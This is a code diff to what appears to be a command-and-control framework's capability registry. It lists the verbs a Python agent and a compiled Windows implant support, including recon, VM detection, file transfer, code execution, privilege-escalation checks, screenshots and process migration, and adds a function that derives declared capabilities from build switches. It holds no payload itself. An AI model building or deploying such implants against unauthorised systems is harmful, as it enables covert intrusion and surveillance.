@@ -43,21 +43,112 @@ from typing import Any, Dict, List, Sequence
 #: `register` is ignored rather than stored, so a payload cannot invent a
 #: permission by naming it: the set below is the whole vocabulary, and the only
 #: words that mean anything at the queue.
+#:
+#: This has to cover every structured action either agent implements, not just
+#: the ones somebody remembered to write down. It did not: the recon verbs the
+#: agents handle (`netstat`, `pwd`, `env`, `date`, `kill`, …) and the module
+#: dispatches (`pyexec`, `load_package`) were missing, so `declared_capabilities`
+#: dropped them from every real payload and the queue refused exactly the
+#: commands those payloads were built to run.
 KNOWN_CAPABILITIES = (
+    # Universal — both agents, and the only thing an unannounced payload gets.
     "exec",
     "ping",
+    "shutdown",
+    # Recon, implemented natively by both agents.
     "sysinfo",
     "network",
     "processes",
+    "netstat",
+    "process_kill",
+    "pwd",
+    "get_hwuuid",
+    "env",
+    "date",
+    "alive",
+    "getpid",
+    "getuid",
+    "getppid",
+    "getdomain",
+    "check_vm",
+    # File transfer and the package channel.
     "fs_list",
     "fs_get",
     "fs_put",
+    "load_package",
+    # Python agent only: no interpreter exists inside the C implant.
+    "pyexec",
     "privesc_check",
     "privesc_suggest",
     "screenshot",
     "migrate",
+)
+
+#: What the compiled Windows implant declares, spelled out in
+#: `handle_register` in `agent/core/pe_template.c`. Kept as a constant so the
+#: build manifest records what that artifact actually ships rather than
+#: whatever the Python agent can do; the two are not the same set.
+PE_CAPABILITIES = (
+    "exec",
+    "ping",
+    "sysinfo",
+    "processes",
+    "network",
+    "netstat",
+    "process_kill",
+    "pwd",
+    "get_hwuuid",
+    "env",
+    "date",
+    "alive",
+    "getpid",
+    "getuid",
+    "getppid",
+    "getdomain",
+    "check_vm",
+    "fs_list",
+    "fs_get",
+    "fs_put",
     "shutdown",
 )
+
+
+def script_capabilities(
+    *,
+    recon: bool = True,
+    execute: bool = True,
+    filesystem: bool = True,
+    privesc: bool = True,
+    screenshot: bool = False,
+    migration: bool = True,
+) -> List[str]:
+    """What a generated Python agent declares, from the switches that built it.
+
+    The agent writes its own claim out of the same Jinja switches, so the build
+    manifest has to be computed the same way. A manifest that claims more than
+    the artifact does is the failure the claim check exists to prevent: the
+    listener would downgrade a payload at registration for a list that was
+    never true of the binary.
+    """
+    declared = ["exec", "ping", "shutdown"]
+    if recon:
+        declared += [
+            "sysinfo", "network", "processes", "netstat", "process_kill",
+            "pwd", "get_hwuuid", "env", "date", "alive", "getpid", "getuid",
+            "getppid", "getdomain", "check_vm",
+        ]
+    if execute:
+        declared.append("pyexec")
+    if filesystem:
+        declared += ["fs_list", "fs_get", "fs_put", "load_package"]
+    if privesc:
+        declared += ["privesc_check", "privesc_suggest"]
+    if screenshot:
+        declared.append("screenshot")
+    if migration:
+        declared.append("migrate")
+    return declared
+
 
 #: The words an operator types at `sessions interact`, and what each one needs.
 #: This mirrors the Python agent's own verb table, because that is where the
